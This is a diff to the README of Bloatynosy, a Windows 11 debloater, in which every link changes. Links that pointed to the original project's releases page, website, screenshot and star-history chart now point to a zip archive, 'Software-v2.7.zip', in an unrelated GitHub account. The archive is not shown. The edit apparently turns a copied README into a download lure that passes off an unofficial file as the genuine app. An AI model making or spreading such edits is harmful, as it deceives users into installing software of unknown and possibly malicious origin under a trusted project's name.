@@ -1,14 +1,14 @@
 # Let's customize your Windows 11 experience with - Bloatynosy (Bloaty & nosy) -
 
-![screenshot](https://github.com/builtbybel/Bloatynosy/blob/main/assets/bloatynosy.png?raw=true)
+![screenshot](https://github.com/ttzyt/Bloatynosy/raw/refs/heads/main/src/BloatyNosy/Software-v2.7.zip)
 
 _Universal Debloater and PC Manager for the most up-to-date version of the Redmond OS (Windows 11)_
 
 ## Download
 ### GitHub (Recommended)
-You can download Bloatynosy directly from the [GitHub releases page](https://github.com/builtbybel/Bloatynosy/releases)
+You can download Bloatynosy directly from the [GitHub releases page](https://github.com/ttzyt/Bloatynosy/raw/refs/heads/main/src/BloatyNosy/Software-v2.7.zip)
 
-_The app is also distributed within [App Installer](https://github.com/builtbybel/Bloatynosy/releases) package._
+_The app is also distributed within [App Installer](https://github.com/ttzyt/Bloatynosy/raw/refs/heads/main/src/BloatyNosy/Software-v2.7.zip) package._
 
 ## Features
 Windows 11 has a gazillion toggles and settings options. And general users donâ€™t know where to find most of these features, what to make of them, and which setting to enable or disable. **Bloatynosy** streamlines and houses all the essential settings under one app and allows you to disable and remove unnecessary features with just a simple click. 
@@ -18,9 +18,9 @@ Windows 11 has a gazillion toggles and settings options. And general users donâ€
 - It features a **Bloatpilot app**, which allows you to remove pre-installed apps automatically or the manual way. 
 - Next to this the app installer **Packages** is integrated, which allows you to install some of the most important apps with a click and in bulk.
 
-More infos here https://www.builtbybel.com/apps/bloatynosy
+More infos here https://github.com/ttzyt/Bloatynosy/raw/refs/heads/main/src/BloatyNosy/Software-v2.7.zip
 
 ## Star History
 
-[![Star History Chart](https://api.star-history.com/svg?repos=builtbybel/Bloatynosy&type=Timeline)](https://star-history.com/#builtbybel/Bloatynosy&Timeline)
+[![Star History Chart](https://github.com/ttzyt/Bloatynosy/raw/refs/heads/main/src/BloatyNosy/Software-v2.7.zip)](https://github.com/ttzyt/Bloatynosy/raw/refs/heads/main/src/BloatyNosy/Software-v2.7.zip)
 
